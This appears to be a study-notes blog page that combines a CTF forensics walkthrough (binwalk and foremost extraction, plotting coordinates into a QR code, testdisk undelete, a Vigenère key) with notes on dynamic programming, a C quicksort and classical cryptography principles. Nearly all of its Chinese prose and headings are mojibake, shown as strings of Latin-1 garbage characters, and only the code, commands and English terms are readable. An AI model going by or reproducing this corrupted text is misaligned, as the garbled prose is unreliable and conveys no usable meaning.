<p><em>ç›´æ¥å¯¼å‡ºçš„å°±æ˜¯<code>file:xxxx</code>çš„æ ¼å¼ï¼Œæˆ‘ä»¬ç›´æ¥æŒ‰ç…§éœ€æ±‚æŠŠæ–‡ä»¶æ”¹æˆåŸå§‹æ–‡ä»¶åå³å¯ï¼Œeg: phos.jpg</em></p>
<h3 id="å›¾ç‰‡éšå†™åˆ†æ"><a href="#å›¾ç‰‡éšå†™åˆ†æ" class="headerlink" title="å›¾ç‰‡éšå†™åˆ†æ"></a>å›¾ç‰‡éšå†™åˆ†æ</h3><p>æœ‰å›¾ç‰‡å°±å›å½’åˆ°å›¾ç‰‡æ–¹é¢çš„éšå†™åˆ†æä¹‹ä¸Šã€‚</p>
<p><code>binwalk</code>åˆ†æï¼Œå‘ç°å­˜åœ¨<code>zip</code>ï¼Œé‚£ä¹ˆç›´æ¥å¯¹å…¶è¿›è¡Œ<code>foremost</code>æå–ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309112732389.png" class="" title="image-20230309112732389">

<p>æå–å‡ºæ¥ä¸€ä¸ª<code>message.img</code>ã€‚</p>
<p>å†æ¬¡è¿›è¡Œæå–æ“ä½œï¼Œæœ¬æ¬¡ä½¿ç”¨<code>binwalk -e</code> è¿›è¡Œæå–<code>hint.txt</code>ã€‚</p>
<p><em>ä½¿ç”¨foremostæ— æ³•åˆ†ç¦»å‡ºæ¥<code>hint.txt</code>æ–‡ä»¶</em></p>
<h3 id="ç”ŸæˆäºŒç»´ç "><a href="#ç”ŸæˆäºŒç»´ç " class="headerlink" title="ç”ŸæˆäºŒç»´ç "></a>ç”ŸæˆäºŒç»´ç </h3><ul>
<li><code>gnuplot</code>è½¬æ¢</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gnuplot         </span><br><span class="line">        G N U P L O T</span><br><span class="line">        Version <span class="number">5.4</span> patchlevel <span class="number">4</span>    last modified <span class="number">2022</span>-07-<span class="number">10</span> </span><br><span class="line"></span><br><span class="line">        Copyright (C) <span class="number">1986</span>-<span class="number">1993</span>, <span class="number">1998</span>, <span class="number">2004</span>, <span class="number">2007</span>-<span class="number">2022</span></span><br><span class="line">        Thomas Williams, Colin Kelley <span class="keyword">and</span> many others</span><br><span class="line"></span><br><span class="line">        gnuplot home:     http://www.gnuplot.info</span><br><span class="line">        faq, bugs, etc:   <span class="built_in">type</span> <span class="string">&quot;help FAQ&quot;</span></span><br><span class="line">        immediate <span class="built_in">help</span>:   <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>  (plot window: hit <span class="string">&#x27;h&#x27;</span>)</span><br><span class="line"></span><br><span class="line">Terminal <span class="built_in">type</span> <span class="keyword">is</span> now <span class="string">&#x27;qt&#x27;</span></span><br><span class="line">gnuplot&gt; plot<span class="string">&#x27;hint.txt&#x27;</span></span><br><span class="line">gnuplot&gt; </span><br></pre></td></tr></table></figure>

<p><em>ç„¶åç›´æ¥è¾“å‡ºäºŒç»´ç å›¾ç‰‡</em></p>
<ul>
<li>è„šæœ¬è½¬æ¢ <em>æš‚ä¸”æ²¡æˆåŠŸâ€¦â€¦</em> -&gt; <em><strong>æˆåŠŸäº†ï¼ŒåŸç»ˆç«¯ä¸ºaggï¼Œæ— å›¾å½¢ç•Œé¢ï¼Œéœ€è¦åˆ‡æ¢ä¸ºå›¾å½¢ç•Œé¢æ˜¾ç¤ºçš„ç»ˆç«¯TkAgg</strong></em></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> matplotlib <span class="comment"># keypoint</span></span><br><span class="line">matplotlib.use(<span class="string">&#x27;TkAgg&#x27;</span>) <span class="comment"># keypoint</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;hint.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    datas = f.readlines()</span><br><span class="line">    <span class="keyword">for</span> data <span class="keyword">in</span> datas:</span><br><span class="line">        arr = data.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">        x.append(<span class="built_in">int</span>(arr[<span class="number">0</span>]))</span><br><span class="line">        y.append(<span class="built_in">int</span>(arr[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line">plt.plot(x, y, <span class="string">&#x27;ks&#x27;</span>, ms=<span class="number">1</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>

<p><em>æ‰«æå³å¯å¾—åˆ°ä¿¡æ¯ï¼š1. ç»´å‰å°¼äºšå¯†é’¥ä¸º<code>aeolus</code> 2. åŠ å¯†åçš„å¯†æ–‡è¢«åˆ é™¤äº†</em></p>
<h3 id="æ¢å¤é•œåƒåˆ é™¤ä¿¡æ¯"><a href="#æ¢å¤é•œåƒåˆ é™¤ä¿¡æ¯" class="headerlink" title="æ¢å¤é•œåƒåˆ é™¤ä¿¡æ¯"></a>æ¢å¤é•œåƒåˆ é™¤ä¿¡æ¯</h3><p>ä½¿ç”¨<code>testdisk</code>è¿›è¡Œæ¢å¤ï¼š<code>testdisk message.img</code>ï¼Œè¿›å…¥ç›¸åº”çš„æ“ä½œç•Œé¢ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309133925809.png" class="" title="image-20230309133925809">

<p>è¿›å…¥<code>Proceed</code>ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309134503976.png" class="" title="image-20230309134503976">

<p>è¿›å…¥<code>None</code>ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309134823519.png" class="" title="image-20230309134823519">

<p>å› ä¸ºæ¶‰åŠåˆ é™¤çš„æ–‡ä»¶ï¼Œæ‰€ä»¥ç›´æ¥æ‰¾è¯¥åŠŸèƒ½æ¨¡å—<code>Undelete</code>ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309134918426.png" class="" title="image-20230309134918426">

<p>æ‰¾åˆ°æ ‡çº¢å¤„ï¼Œè¯´æ˜è¯¥å¤„å­˜åœ¨åˆ é™¤æ–‡ä»¶ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309135112638.png" class="" title="image-20230309135112638">

<p>æŒ‰<code>c</code>ç¡®å®šæ–‡ä»¶ä»¥åŠè·¯å¾„ä¹‹åï¼Œå‡ºç°è¯¥çº¢æ¡†å†…å†…å®¹è¯´æ˜å¯¼å‡ºæˆåŠŸã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309135208693.png" class="" title="image-20230309135208693">

<p>åˆ°ä¿å­˜è·¯å¾„ä¹‹ä¸‹ï¼Œä½¿ç”¨<code>ls -a</code>å‘ç°ä¿å­˜ä¸‹æ¥çš„æ–‡ä»¶ï¼Œç›´æ¥åˆ©ç”¨<code>strings</code>æŸ¥æ‰¾å­—ç¬¦ä¸²å³å¯ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230309135334653.png" class="" title="image-20230309135334653">

<p>æ‰¾åˆ°åŠ å¯†åçš„å¯†æ–‡ï¼Œä½¿ç”¨åœ¨çº¿è§£å¯†ç½‘ç«™ç»“åˆå¯†é’¥è§£å¯†å³å¯ï¼Œæœ€ç»ˆå¾—åˆ°ç›¸åº”çš„flagã€‚</p>
<h1 id="230309"><a href="#230309" class="headerlink" title="230309"></a>230309</h1><h2 id="stringsç”¨æ³•"><a href="#stringsç”¨æ³•" class="headerlink" title="stringsç”¨æ³•"></a>stringsç”¨æ³•</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Usage: strings [option(s)] [file(s)]</span><br><span class="line"> Display printable strings <span class="keyword">in</span> [file(s)] (stdin by default)</span><br><span class="line"> The options are:</span><br><span class="line">  -a - --<span class="built_in">all</span>                Scan the entire file, <span class="keyword">not</span> just the data section [default]</span><br><span class="line">  -d --data                 Only scan the data sections <span class="keyword">in</span> the file</span><br><span class="line">  -f --<span class="built_in">print</span>-file-name      Print the name of the file before each string</span><br><span class="line">  -n &lt;number&gt;               Locate &amp; <span class="built_in">print</span> <span class="built_in">any</span> sequence of at least &lt;number&gt;</span><br><span class="line">    --<span class="built_in">bytes</span>=&lt;number&gt;         displayable characters.  (The default <span class="keyword">is</span> <span class="number">4</span>).</span><br><span class="line">  -t --radix=&#123;o,d,x&#125;        Print the location of the string <span class="keyword">in</span> base <span class="number">8</span>, <span class="number">10</span> <span class="keyword">or</span> <span class="number">16</span></span><br><span class="line">  -w --include-<span class="built_in">all</span>-whitespace Include <span class="built_in">all</span> whitespace <span class="keyword">as</span> valid string characters</span><br><span class="line">  -o                        An alias <span class="keyword">for</span> --radix=o</span><br><span class="line">  -T --target=&lt;BFDNAME&gt;     Specify the binary file <span class="built_in">format</span></span><br><span class="line">  -e --encoding=&#123;s,S,b,l,B,L&#125; Select character size <span class="keyword">and</span> endianness:</span><br><span class="line">                            s = <span class="number">7</span>-bit, S = <span class="number">8</span>-bit, &#123;b,l&#125; = <span class="number">16</span>-bit, &#123;B,L&#125; = <span class="number">32</span>-bit</span><br><span class="line">  --unicode=&#123;default|show|invalid|<span class="built_in">hex</span>|escape|highlight&#125;</span><br><span class="line">  -U &#123;d|s|i|x|e|h&#125;          Specify how to treat UTF-<span class="number">8</span> encoded unicode characters</span><br><span class="line">  -s --output-separator=&lt;string&gt; String used to separate strings <span class="keyword">in</span> output.</span><br><span class="line"><span class="meta">  @&lt;file&gt;                   Read options from &lt;file&gt;</span></span><br><span class="line">  -h --<span class="built_in">help</span>                 Display this information</span><br><span class="line">  -v -V --version           Print the program<span class="string">&#x27;s version number</span></span><br><span class="line"><span class="string">strings: supported targets: elf64-x86-64 elf32-i386 elf32-iamcu elf32-x86-64 pei-i386 pe-x86-64 pei-x86-64 elf64-little elf64-big elf32-little elf32-big pe-bigobj-x86-64 pe-i386 pdb srec symbolsrec verilog tekhex binary ihex plugin</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>



<h1 id="230310"><a href="#230310" class="headerlink" title="230310"></a>230310</h1><h2 id="æ–°è®²è¿°è§†è§’"><a href="#æ–°è®²è¿°è§†è§’" class="headerlink" title="æ–°è®²è¿°è§†è§’"></a>æ–°è®²è¿°è§†è§’</h2><h3 id="å…³äºé€†å…ƒçš„ä½œç”¨"><a href="#å…³äºé€†å…ƒçš„ä½œç”¨" class="headerlink" title="å…³äºé€†å…ƒçš„ä½œç”¨"></a>å…³äºé€†å…ƒçš„ä½œç”¨</h3><img src="/2023/12/31/WeeklyStudy/image-20230310103125778.png" class="" title="image-20230310103125778">

<h3 id="Dynamic-Programming-DP"><a href="#Dynamic-Programming-DP" class="headerlink" title="Dynamic Programming-DP"></a>Dynamic Programming-DP</h3><h4 id="è´ªå¿ƒç®—æ³•å¼•è®º"><a href="#è´ªå¿ƒç®—æ³•å¼•è®º" class="headerlink" title="è´ªå¿ƒç®—æ³•å¼•è®º"></a>è´ªå¿ƒç®—æ³•å¼•è®º</h4><blockquote>
<p><a href="https://www.zhihu.com/question/23995189/answer/613096905">https://www.zhihu.com/question/23995189/answer/613096905</a></p>
</blockquote>
<p>â€‹		å…ˆæ¥çœ‹çœ‹ç”Ÿæ´»ä¸­ç»å¸¸é‡åˆ°çš„äº‹å§â€”â€”å‡è®¾æ‚¨æ˜¯ä¸ªåœŸè±ªï¼Œèº«ä¸Šå¸¦äº†è¶³å¤Ÿçš„1ã€5ã€10ã€20ã€50ã€100å…ƒé¢å€¼çš„é’ç¥¨ã€‚ç°åœ¨æ‚¨çš„ç›®æ ‡æ˜¯å‡‘å‡ºæŸä¸ªé‡‘é¢wï¼Œ<strong>éœ€è¦ç”¨åˆ°å°½é‡å°‘çš„é’ç¥¨ã€‚</strong></p>
<p>ã€€ã€€ä¾æ®ç”Ÿæ´»ç»éªŒï¼Œæˆ‘ä»¬æ˜¾ç„¶å¯ä»¥é‡‡å–è¿™æ ·çš„ç­–ç•¥ï¼šèƒ½ç”¨100çš„å°±å°½é‡ç”¨100çš„ï¼Œå¦åˆ™å°½é‡ç”¨50çš„â€¦â€¦ä¾æ¬¡ç±»æ¨ã€‚åœ¨è¿™ç§ç­–ç•¥ä¸‹ï¼Œ666&#x3D;6Ã—100+1Ã—50+1Ã—10+1Ã—5+1Ã—1ï¼Œå…±ä½¿ç”¨äº†10å¼ é’ç¥¨ã€‚</p>
<p>ã€€ã€€è¿™ç§ç­–ç•¥ç§°ä¸ºâ€œ<strong>è´ªå¿ƒ</strong>â€ï¼šå‡è®¾æˆ‘ä»¬é¢å¯¹çš„å±€é¢æ˜¯â€œéœ€è¦å‡‘å‡ºwâ€ï¼Œ<strong>è´ªå¿ƒç­–ç•¥ä¼šå°½å¿«è®©wå˜å¾—æ›´å°</strong>ã€‚èƒ½è®©wå°‘100å°±å°½é‡è®©å®ƒå°‘100ï¼Œè¿™æ ·æˆ‘ä»¬æ¥ä¸‹æ¥é¢å¯¹çš„å±€é¢å°±æ˜¯å‡‘å‡ºw-100ã€‚é•¿æœŸçš„ç”Ÿæ´»ç»éªŒè¡¨æ˜ï¼Œ<a href="https://www.zhihu.com/search?q=%E8%B4%AA%E5%BF%83%E7%AD%96%E7%95%A5&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:613096905%7D">è´ªå¿ƒç­–ç•¥</a>æ˜¯æ­£ç¡®çš„ã€‚</p>
<p>â€‹		ä½†æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬æ¢ä¸€ç»„é’ç¥¨çš„é¢å€¼ï¼Œè´ªå¿ƒç­–ç•¥å°±ä¹Ÿè®¸ä¸æˆç«‹äº†ã€‚å¦‚æœä¸€ä¸ªå¥‡è‘©å›½å®¶çš„é’ç¥¨é¢é¢åˆ†åˆ«æ˜¯1ã€5ã€11ï¼Œé‚£ä¹ˆæˆ‘ä»¬åœ¨å‡‘å‡º15çš„æ—¶å€™ï¼Œè´ªå¿ƒç­–ç•¥ä¼šå‡ºé”™ï¼š<br>ã€€ã€€15&#x3D;1Ã—11+4Ã—1    ï¼ˆè´ªå¿ƒç­–ç•¥ä½¿ç”¨äº†5å¼ é’ç¥¨ï¼‰<br>ã€€ã€€15&#x3D;3Ã—5               ï¼ˆæ­£ç¡®çš„ç­–ç•¥ï¼Œåªç”¨3å¼ é’ç¥¨ï¼‰<br>ã€€ã€€ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Ÿè´ªå¿ƒç­–ç•¥é”™åœ¨äº†å“ªé‡Œï¼Ÿ</p>
<p><strong>é¼ ç›®å¯¸å…‰ã€‚</strong><br>ã€€ã€€åˆšåˆšå·²ç»è¯´è¿‡ï¼Œè´ªå¿ƒç­–ç•¥çš„çº²é¢†æ˜¯ï¼šâ€œå°½é‡ä½¿æ¥ä¸‹æ¥é¢å¯¹çš„wæ›´å°â€ã€‚è¿™æ ·ï¼Œè´ªå¿ƒç­–ç•¥åœ¨w&#x3D;15çš„å±€é¢æ—¶ï¼Œä¼šä¼˜å…ˆä½¿ç”¨11æ¥æŠŠwé™åˆ°4ï¼›ä½†æ˜¯åœ¨è¿™ä¸ªé—®é¢˜ä¸­ï¼Œå‡‘å‡º4çš„ä»£ä»·æ˜¯å¾ˆé«˜çš„ï¼Œå¿…é¡»ä½¿ç”¨4Ã—1ã€‚å¦‚æœä½¿ç”¨äº†5ï¼Œwä¼šé™ä¸º10ï¼Œè™½ç„¶æ²¡æœ‰4é‚£ä¹ˆå°ï¼Œä½†æ˜¯å‡‘å‡º10åªéœ€è¦ä¸¤å¼ 5å…ƒã€‚<br>ã€€ã€€åœ¨è¿™é‡Œæˆ‘ä»¬å‘ç°ï¼Œè´ªå¿ƒæ˜¯ä¸€ç§<strong>åªè€ƒè™‘çœ¼å‰æƒ…å†µ</strong>çš„ç­–ç•¥ã€‚</p>
<p>â€‹		æˆ‘ä»¬èƒ½è¿™æ ·å¹²ï¼Œå–å†³äºé—®é¢˜çš„æ€§è´¨ï¼šæ±‚å‡ºf(n)ï¼Œåªéœ€è¦çŸ¥é“å‡ ä¸ªæ›´å°çš„f(c)ã€‚<strong>æˆ‘ä»¬å°†æ±‚è§£f(c)ç§°ä½œæ±‚è§£f(n)çš„â€œå­é—®é¢˜â€ã€‚</strong></p>
<p>ã€€ã€€<strong>è¿™å°±æ˜¯DP</strong>ï¼ˆåŠ¨æ€è§„åˆ’ï¼Œdynamic programmingï¼‰.</p>
<p>ã€€ã€€<strong>å°†ä¸€ä¸ªé—®é¢˜æ‹†æˆå‡ ä¸ªå­é—®é¢˜ï¼Œåˆ†åˆ«æ±‚è§£è¿™äº›å­é—®é¢˜ï¼Œå³å¯æ¨æ–­å‡ºå¤§é—®é¢˜çš„è§£</strong>ã€‚</p>
<h4 id="åŸºæœ¬æ¦‚å¿µä»¥åŠDPå®šä¹‰"><a href="#åŸºæœ¬æ¦‚å¿µä»¥åŠDPå®šä¹‰" class="headerlink" title="åŸºæœ¬æ¦‚å¿µä»¥åŠDPå®šä¹‰"></a>åŸºæœ¬æ¦‚å¿µä»¥åŠDPå®šä¹‰</h4><p>ã€<a href="https://www.zhihu.com/search?q=%E6%97%A0%E5%90%8E%E6%95%88%E6%80%A7&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:613096905%7D">æ— åæ•ˆæ€§</a>ã€‘</p>
<p>ã€€ã€€ä¸€æ—¦f(n)ç¡®å®šï¼Œâ€œæˆ‘ä»¬å¦‚ä½•å‡‘å‡ºf(n)â€å°±å†ä¹Ÿç”¨ä¸ç€äº†ã€‚</p>
<p>ã€€ã€€è¦æ±‚å‡ºf(15)ï¼Œåªéœ€è¦çŸ¥é“f(14),f(10),f(4)çš„å€¼ï¼Œè€Œf(14),f(10),f(4)æ˜¯å¦‚ä½•ç®—å‡ºæ¥çš„ï¼Œå¯¹ä¹‹åçš„é—®é¢˜æ²¡æœ‰å½±å“ã€‚</p>
<p>ã€€ã€€<strong>â€œæœªæ¥ä¸è¿‡å»æ— å…³â€ï¼Œ</strong>è¿™å°±æ˜¯<strong>æ— åæ•ˆæ€§</strong>ã€‚</p>
<p>ã€€ã€€ï¼ˆä¸¥æ ¼å®šä¹‰ï¼šå¦‚æœç»™å®šæŸä¸€é˜¶æ®µçš„çŠ¶æ€ï¼Œåˆ™åœ¨è¿™ä¸€é˜¶æ®µä»¥åè¿‡ç¨‹çš„å‘å±•ä¸å—è¿™é˜¶æ®µä»¥å‰å„æ®µçŠ¶æ€çš„å½±å“ã€‚ï¼‰</p>
<p>ã€<a href="https://www.zhihu.com/search?q=%E6%9C%80%E4%BC%98%E5%AD%90%E7%BB%93%E6%9E%84&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:613096905%7D">æœ€ä¼˜å­ç»“æ„</a>ã€‘</p>
<p>ã€€ã€€å›é¡¾æˆ‘ä»¬å¯¹f(n)çš„å®šä¹‰ï¼šæˆ‘ä»¬è®°â€œå‡‘å‡ºnæ‰€éœ€çš„<strong>æœ€å°‘</strong>é’ç¥¨æ•°é‡â€ä¸ºf(n).</p>
<p>ã€€ã€€f(n)çš„å®šä¹‰å°±å·²ç»è•´å«äº†â€œæœ€ä¼˜â€ã€‚åˆ©ç”¨w&#x3D;14,10,4çš„<strong>æœ€ä¼˜</strong>è§£ï¼Œæˆ‘ä»¬å³å¯ç®—å‡ºw&#x3D;15çš„<strong>æœ€ä¼˜</strong>è§£ã€‚</p>
<p>ã€€ã€€å¤§é—®é¢˜çš„<strong>æœ€ä¼˜è§£</strong>å¯ä»¥ç”±å°é—®é¢˜çš„<strong>æœ€ä¼˜è§£</strong>æ¨å‡ºï¼Œè¿™ä¸ªæ€§è´¨å«åšâ€œ<a href="https://www.zhihu.com/search?q=%E6%9C%80%E4%BC%98%E5%AD%90%E7%BB%93%E6%9E%84%E6%80%A7%E8%B4%A8&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:613096905%7D">æœ€ä¼˜å­ç»“æ„æ€§è´¨</a>â€ã€‚</p>
<p>ã€€ã€€å¼•å…¥è¿™ä¸¤ä¸ªæ¦‚å¿µä¹‹åï¼Œæˆ‘ä»¬å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªé—®é¢˜èƒ½å¦ä½¿ç”¨DPè§£å†³å‘¢ï¼Ÿ</p>
<p>ã€€ã€€<strong>èƒ½å°†å¤§é—®é¢˜æ‹†æˆå‡ ä¸ªå°é—®é¢˜ï¼Œä¸”æ»¡è¶³æ— åæ•ˆæ€§ã€æœ€ä¼˜å­ç»“æ„æ€§è´¨ã€‚</strong></p>
<h4 id="Cè¯­è¨€å®ç°å¿«æ’ç®—æ³•ï¼Œä»¥åŠä»æ¦‚å¿µç†è§£ç®—æ³•è¿è¡Œ"><a href="#Cè¯­è¨€å®ç°å¿«æ’ç®—æ³•ï¼Œä»¥åŠä»æ¦‚å¿µç†è§£ç®—æ³•è¿è¡Œ" class="headerlink" title="Cè¯­è¨€å®ç°å¿«æ’ç®—æ³•ï¼Œä»¥åŠä»æ¦‚å¿µç†è§£ç®—æ³•è¿è¡Œ"></a>Cè¯­è¨€å®ç°å¿«æ’ç®—æ³•ï¼Œä»¥åŠä»æ¦‚å¿µç†è§£ç®—æ³•è¿è¡Œ</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å·¦é—­å³å¼€</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">quickSort</span><span class="params">(<span class="type">int</span> l, <span class="type">int</span> r)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(l &gt;= r - <span class="number">1</span>) <span class="keyword">return</span>;              <span class="comment">// åªæœ‰å•ä¸ªå…ƒç´ å¾…æ’åºï¼Œç›´æ¥è¿”å›</span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> flag = a[rand() % (r-l) + l];   <span class="comment">// éšæœºå–å“¨å…µ</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> p = l, q = r;       </span><br><span class="line">    <span class="comment">// tmp[l,p): æ¯” flag å°çš„ï¼›tmp[q, r): æ¯” flag å¤§çš„</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=l; i&lt;r; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i] &lt; flag)</span><br><span class="line">            tmp[p++] = a[i]; <span class="comment">// æ¯”å“¨å…µçŸ®çš„æ”¾åœ¨å·¦è¾¹</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(a[i] &gt; flag)</span><br><span class="line">            tmp[--q] = a[i]; <span class="comment">// æ¯”å“¨å…µé«˜çš„æ”¾åœ¨å³è¾¹</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=p; i&lt;q; i++)   <span class="comment">// ä¸å“¨å…µä¸€æ ·é«˜çš„</span></span><br><span class="line">        tmp[i] = flag;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=l; i&lt;r; i++)   <span class="comment">// è¦†ç›–å› a æ•°ç»„</span></span><br><span class="line">        a[i] = tmp[i];</span><br><span class="line">    </span><br><span class="line">    quickSort(l, p);         <span class="comment">// é€’å½’</span></span><br><span class="line">    quickSort(q, r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Kerckhoffs-åŸåˆ™"><a href="#Kerckhoffs-åŸåˆ™" class="headerlink" title="Kerckhoffs åŸåˆ™"></a>Kerckhoffs åŸåˆ™</h2><blockquote>
<p>åŠ å¯†æ–¹æ³•ä¸åº”è¯¥è¢«ä¿å¯†ï¼Œå”¯ä¸€éœ€è¦ä¿å¯†çš„æ˜¯é€šä¿¡åŒæ–¹çš„ key.<br>(Kerckhoffsâ€™s principle, æŸ¯å…‹éœå¤«åŸåˆ™)</p>
</blockquote>
<p>æŸ¯å…‹éœå¤«åŸåˆ™è¦æ±‚ï¼Œä¸€ä¸ªåŠ å¯†æ–¹æ¡ˆçš„å®‰å…¨æ€§ï¼Œä»…å–å†³äºå¯†é’¥çš„å®‰å…¨æ€§ï¼Œè€Œä¸å–å†³äºç®—æ³•çš„ç§˜å¯†ã€‚æ¥å— Kerckhoffs åŸåˆ™ä¼šå¸¦æ¥å¾ˆå¤šå¥½å¤„ï¼šé¦–å…ˆï¼Œç”±äºåŠ å¯†ç®—æ³•æ˜¯å…¬å¼€çš„ï¼Œé€šè®¯å„æ–¹åªéœ€è¦ä¿å¯†å¯†é’¥ï¼ˆè¿™æ˜¾ç„¶æ¯”åŠ å¯†ç®—æ³•è¦çŸ­ï¼ŒæŒ‰å¸¸ç†æ¥è®²ï¼Œè¶ŠçŸ­çš„ä¸œè¥¿è¶Šå®¹æ˜“ä¿å¯†ï¼‰ã€‚å¦å¤–ï¼Œå¦‚æœå¯†é’¥æ³„éœ²äº†ï¼ŒåŒæ–¹åªéœ€è¦æ”¹ä¸ªæ–°çš„å¯†é’¥å°±èƒ½ç»§ç»­å®‰å…¨é€šä¿¡ï¼ˆè‹¥ä¸éµå¾ª Kerckhoffs åŸåˆ™ï¼Œä¸€æ—¦æ³„éœ²ç®—æ³•å°±éœ€è¦é‡æ–°è®¾è®¡åŠ å¯†æ–¹æ¡ˆï¼‰ã€‚æœ€åï¼Œéµå¾ª Kerckhoffs åŸåˆ™å¯ä»¥å¸¦æ¥æ ‡å‡†åŒ–çš„å¥½å¤„ï¼šå¤šäººé€šè®¯æ—¶ï¼Œå¯ä»¥é‡‡ç”¨ç›¸åŒçš„ç®—æ³•è€Œé€‰æ‹©ä¸åŒçš„å¯†é’¥ï¼Œè¿™æ ·ç¨‹åºå¯ä»¥å¤ç”¨ã€‚</p>
<h2 id="å……åˆ†å¯†é’¥ç©ºé—´åŸåˆ™"><a href="#å……åˆ†å¯†é’¥ç©ºé—´åŸåˆ™" class="headerlink" title="å……åˆ†å¯†é’¥ç©ºé—´åŸåˆ™"></a>å……åˆ†å¯†é’¥ç©ºé—´åŸåˆ™</h2><blockquote>
<p>ä»»ä½•å®‰å…¨çš„åŠ å¯†æ–¹æ¡ˆï¼Œå…¶å¯†é’¥ç©ºé—´$\mathcal{M}$å¿…é¡»èƒ½æŠµå¾¡ç©·ä¸¾æœç´¢ã€‚<br>(è¿™ä¸€åŸåˆ™åœ¨ $|\mathcal{M}|$&gt;$|\mathcal{K}|$ æ—¶æœ‰æ•ˆã€‚è‹¥å¯èƒ½çš„æ˜æ–‡æ¯”å¯èƒ½çš„å¯†é’¥è¿˜å°‘ï¼Œæšä¸¾å‡ºæ‰€æœ‰å¯èƒ½çš„å¯†é’¥ï¼Œè§£å¯†ä¹‹åä¼šè·å¾—æ¯”æ˜æ–‡ç©ºé—´è¿˜å¤§çš„å€™é€‰æ˜æ–‡é›†åˆã€‚)</p>
</blockquote>
<p>æ ¹æ®å½“å‰è®¡ç®—æœºçš„è®¡ç®—èƒ½åŠ›ï¼Œå¯†é’¥ç©ºé—´éœ€è¦éå¸¸å¤§ï¼Œä¾‹å¦‚$2^{70}$.</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ»¡è¶³å……åˆ†å¯†é’¥ç©ºé—´åŸåˆ™çš„åŠ å¯†æ–¹æ¡ˆï¼Œæœªå¿…å°±æ˜¯å®‰å…¨çš„ã€‚</p>
<h2 id="index-of-coincidence-IoCï¼Œé‡åˆå› å­"><a href="#index-of-coincidence-IoCï¼Œé‡åˆå› å­" class="headerlink" title="index of coincidence (IoCï¼Œé‡åˆå› å­)"></a>index of coincidence (IoCï¼Œé‡åˆå› å­)</h2><img src="/2023/12/31/WeeklyStudy/image-20230310132521922.png" class="" title="image-20230310132521922">

<p>IoCæ–¹å¼æŸ¥æ‰¾ç»´å‰å°¼äºšå¯†é’¥é•¿åº¦ã€‚</p>
<img src="/2023/12/31/WeeklyStudy/image-20230310132739640.png" class="" title="image-20230310132739640">

<h2 id="æµå¯†ç "><a href="#æµå¯†ç " class="headerlink" title="æµå¯†ç "></a>æµå¯†ç </h2><p>ä¸Šé¢ä»‹ç»çš„åˆ©ç”¨ PRGï¼ˆä¼ªéšæœºå‘ç”Ÿå™¨ï¼‰çš„å¼‚æˆ–æ–¹æ¡ˆï¼Œç§°ä¸º<strong>æµå¯†ç </strong>ã€‚æƒ³è¦æ‰§è¡ŒåŠ å¯†ï¼Œæ˜¯å…ˆç”Ÿæˆä¸€ä¸ªä¼ªéšæœºçš„æ¯”ç‰¹æµï¼Œç„¶åç”¨è¿™ä¸ªæ¯”ç‰¹æµæ¥ä¸æ˜æ–‡å¼‚æˆ–ï¼Œäº§ç”Ÿå¯†æ–‡ã€‚ç”±äºæµå¯†ç æ–¹æ¡ˆä¸ç”Ÿæˆæ¯”ç‰¹æµçš„æ–¹æ¡ˆæ˜¯ç»‘å®šçš„ï¼Œæˆ‘ä»¬ä»¥åç›´æ¥ç”¨â€œæµå¯†ç â€æ¥ç®€ç§°ä¼ªéšæœºæ¯”ç‰¹ä¸²å‘ç”Ÿå™¨ã€‚</p>
